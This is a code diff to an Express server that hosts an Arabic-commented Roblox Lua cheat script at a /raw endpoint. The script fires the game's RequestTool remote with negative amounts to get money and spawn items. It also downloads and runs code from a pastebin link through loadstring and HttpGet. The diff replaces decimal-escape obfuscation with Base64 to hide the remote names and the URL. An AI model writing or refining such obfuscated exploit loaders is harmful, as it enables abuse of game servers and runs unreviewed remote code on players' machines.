@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// الكود الموزون: حماية قوية + لغة عربية سليمة
+// الكود المصلح باستخدام Base64 للحماية والاستقرار
 const myScript = `
 local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 local MainFrame = Instance.new("Frame", ScreenGui)
@@ -12,11 +12,27 @@ local TabsFrame = Instance.new("Frame", MainFrame)
 local ContentFrame = Instance.new("Frame", MainFrame)
 local MinimizeBtn = Instance.new("TextButton", ScreenGui)
 
--- [ وظيفة حماية مشفرة داخلياً ]
-local function _X(...) 
-    -- فك تشفير اسم الريموت عند الاستدعاء فقط
-    local r = "\82\101\113\117\101\115\116\84\111\111\108"
-    game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101")[r]:FireServer(...)
+-- [ فك التشفير الآمن ]
+local function decode(str)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    str = string.gsub(str, '[^'..b..'=]', '')
+    return (str:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r, f = '', (b:find(x) - 1)
+        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d%d%d%d%d%d', function(x)
+        local c = 0
+        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local function SecureRun(item, val)
+    -- فك تشفير اسم الريموت (RequestTool) والمخزن (ReplicatedStorage) لحظياً
+    local rs = game:GetService(decode("UmVwbGljYXRlZFN0b3JhZ2U="))
+    local rt = rs:WaitForChild(decode("UmVxdWVzdFRvb2w="))
+    rt:FireServer(item, val)
 end
 
 MainFrame.Size = UDim2.new(0, 350, 0, 300)
@@ -38,7 +54,7 @@ Instance.new("UICorner", MinimizeBtn).CornerRadius = UDim.new(1, 0)
 TopBar.Size = UDim2.new(1, 0, 0, 35)
 TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 Title.Size = UDim2.new(1, 0, 1, 0)
-Title.Text = "My Private Script v3"
+Title.Text = "My Private Script v4"
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 TabsFrame.Size = UDim2.new(0, 80, 1, -45)
@@ -72,7 +88,6 @@ local function CreateTab(tabName)
     return page
 end
 
--- الأقسام بالعربي الواضح
 local TabTajmee = CreateTab("تجميع")
 local TabSpawn = CreateTab("رسبنة")
 
@@ -96,14 +111,13 @@ Instance.new("UICorner", AmountInput)
 AddButton(TabTajmee, "إضافة الفلوس فورا", function()
     local val = tonumber(AmountInput.Text)
     if val then
-        _X("Desert Deagle", -math.abs(val))
+        SecureRun("Desert Deagle", -math.abs(val))
     end
 end)
 
 AddButton(TabTajmee, "تنشيط الأوتو كليك", function()
-    -- الرابط مشفر داخلياً
-    local _link = "\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\101\82\49\72\80\88\102\119"
-    loadstring(game:HttpGet(_link))()
+    -- الرابط مشفر بـ Base64
+    loadstring(game:HttpGet(decode("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VSMUhQWGZ3")))()
 end)
 
 local items = {
@@ -119,9 +133,7 @@ local items = {
 }
 
 for _, item in pairs(items) do
-    AddButton(TabSpawn, item[1], function() 
-        _X(item[2], 0) 
-    end)
+    AddButton(TabSpawn, item[1], function() SecureRun(item[2], 0) end)
 end
 
 TabTajmee.Visible = true
@@ -133,6 +145,6 @@ app.get('/raw', (req, res) => {
     res.send(myScript);
 });
 
-app.get('/', (req, res) => res.send('Arabic Script Fixed!'));
+app.get('/', (req, res) => res.send('Server Status: Stable & Protected'));
 
 app.listen(PORT, () => console.log('Server is active on port ' + PORT));
